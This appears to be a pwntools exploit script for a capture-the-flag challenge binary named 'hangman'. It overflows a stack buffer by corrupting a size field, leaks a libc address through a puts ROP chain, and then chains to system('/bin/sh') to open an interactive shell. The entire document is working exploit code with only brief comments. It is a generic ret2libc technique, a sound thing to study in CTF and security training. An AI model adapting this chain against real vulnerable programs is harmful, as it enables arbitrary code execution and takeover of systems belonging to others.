from pwn import *
from ctypes import CDLL
elf = ELF('./hangman', checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)
libc_cdll = CDLL('/usr/lib/libc.so.6')

p = elf.process()

def choice(index, data):
    p.sendlineafter(b'choice: ', b'%d' % index)
    p.sendlineafter(b'word: ', b'%s' % data)

# idk why i need this :3
t=libc_cdll.time(0)
libc_cdll.srand(t)
word = open('./words.list', 'r').read().split()[(libc_cdll.rand()%17)]

# overwrite size w 0xff
choice(2, b'A'*0x20 + b'\xff')
p.sendafter(b'choice: ', b'\n')

# craft payload to leak
pop_rdi = p64(0x00000000004019a3)
pop_rsi_r15 = p64(0x00000000004019a1)
payload = b''.join([
    pop_rdi, p64(elf.got['puts']),
    p64(elf.plt['puts']),
    p64(elf.sym['main'])
])

# overwrite until return address
choice(2, b'A'*0x20         # padding
          + p32(0xff)       # game->size
          + p32(0x00)       # game->hp
          + p64(0x41414141)
          + p64(0x42424242)
          + p64(0x43434343)
          + payload # return address
)

# get leak and calculate offset
leak = u64(p.recvline_endswith(b'\x7f').ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.info(f'libc base 0x{libc.address:x}')

# overwrite size w 0xff
choice(2, b'A'*0x20 + b'\xff')
p.sendafter(b'choice: ', b'\n')

# craft payload to get shell
payload = b''.join([
    pop_rdi, p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system']),
])

# overwrite until return address
choice(2, b'A'*0x20         # padding
          + p32(0xff)       # game->size
          + p32(0x00)       # game->hp
          + p64(0x41414141)
          + p64(0x42424242)
          + p64(0x43434343)
          + payload # return address
)
p.interactive()